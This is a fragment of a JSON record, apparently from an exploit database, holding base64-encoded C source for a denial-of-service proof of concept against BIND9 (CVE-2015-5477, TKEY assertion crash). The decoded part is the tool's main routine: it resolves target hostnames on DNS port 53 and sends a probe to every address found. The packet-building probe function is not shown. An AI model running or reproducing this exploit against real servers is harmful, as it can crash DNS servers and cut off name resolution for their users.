k7fQ0KI2VuZGlmDQoNCiAgICBmcHJpbnRmKHN0ZGVyciwgIi0tLSBQb0MgZm9yIENWRS0yMDE1LTU0NzcgQklORDkgVEtFWSBhc3NlcnQgRG9TIC0tLVxuIik7DQoNCiAgICBpZiAoYXJnYyA8PSAxKSB7DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dIG5vIGhvc3Qgc3BlY2lmaWVkXG4iKTsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJ1c2FnZTpcbiB0a2lsbCA8aG9zdG5hbWU+XG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KDQogICAgLyoNCiAgICAgKiBRdWVyeSBhbGwgdGFyZ2V0cyBzcGVjaWZpZWQgb24gdGhlIGNvbW1hbmQgbGluZQ0KICAgICAqLw0KICAgIGZvciAoaT0xOyBpPGFyZ2M7IGkrKykgew0KICAgICAgICBjb25zdCBjaGFyICpob3N0bmFtZSA9IGFyZ3ZbaV07DQogICAgICAgIHN0cnVjdCBhZGRyaW5mbyAqaW5mbzsNCiAgICAgICAgc3RydWN0IGFkZHJpbmZvICp0YXJnZXQ7DQogICAgICAgIGNoYXIgb2xkdGFyZ2V0WzI1Nl0gPSAiIjsNCiAgICAgICAgaW50IHg7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogTG9va3VwIHRoZSBuYW1lIG9mIHRoZSB0YXJnZXQNCiAgICAgICAgICovDQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiWytdICVzOiBSZXNvbHZpbmcgdG8gSVAgYWRkcmVzc1xuIiwgaG9zdG5hbWUpOw0KICAgICAgICB4ID0gZ2V0YWRkcmluZm8oaG9zdG5hbWUsICI1MyIsIDAsICZpbmZvKTsNCiAgICAgICAgaWYgKHggIT0gMCkgew0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbLV0gJXM6IGZhaWxlZDogJXNcbiIsIGhvc3RuYW1lLCBnYWlfc3RyZXJyb3IoeCkpOw0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoaW5mby0+YWlfbmV4dCkgew0KICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbK10gJXM6IFJlc29sdmVkIHRvIG11bHRpcGxlIElQcyAoTk9URSlcbiIsIGhvc3RuYW1lKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qDQogICAgICAgICAqIFNpbmNlIGEgbmFtZSBjYW4gcmV0dXJuIG11bHRpcGxlIElQIGFkZHJlc3NlcywNCiAgICAgICAgICogc2VuZCBhIHByb2JlIHRvIGFsbCB0aGUgcmVzdWx0cw0KICAgICAgICAgKi8NCiAgICAgICAgZm9yICh0YXJnZXQ9aW5mbzsgdGFyZ2V0OyB0YXJnZXQgPSB0YXJnZXQtPmFpX25leHQpIHsNCiAgICAgICAgICAgIGNoYXIgbmV3dGFyZ2V0WzI1Nl07DQoNCiAgICAgICAgICAgIC8qIGJhaCwgc3R1cGlkIGJ1ZyBpbiBMaW51eCBnZXRzIHRoZSBzYW1lIHRhcmdldCBtdWx0aXBsZQ0KICAgICAgICAgICAgICogdGltZXMgKi8NCiAgICAgICAgICAgIGdldG5hbWVpbmZvKHRhcmdldC0+YWlfYWRkciwgdGFyZ2V0LT5haV9hZGRybGVuLCBuZXd0YXJnZXQsIHNpemVvZihuZXd0YXJnZXQpLCBOVUxMLCAwLCBOSV9OVU1FUklDSE9TVCk7DQogICAgICAgICAgICBpZiAoc3RyY21wKG5ld3RhcmdldCwgb2xkdGFyZ2V0KSA9PSAwKQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgbWVtY3B5KG9sZHRhcmdldCwgbmV3dGFyZ2V0LCBzaXplb2Yob2xkdGFyZ2V0KSk7DQoNCiAgICAgICAgICAgIHByb2JlKHRhcmdldCk7DQogICAgICAgICAgICBwcmludGYoIlxuIik7DQogICAgICAgIH0NCg0KICAgICAgICAvKg0KICAgICAgICAgKiBDbGVhbnVwDQogICAgICAgICAqLw0KICAgICAgICBmcmVlYWRkcmluZm8oaW5mbyk7DQogICAgfQ0KDQogICAgcmV0dXJuIDA7DQp9", 
    "filename": "platforms/multiple/dos/37721.c", 
    "id": "37721", 
    "cves": [
        "CVE-2015-5477"
    ]
}
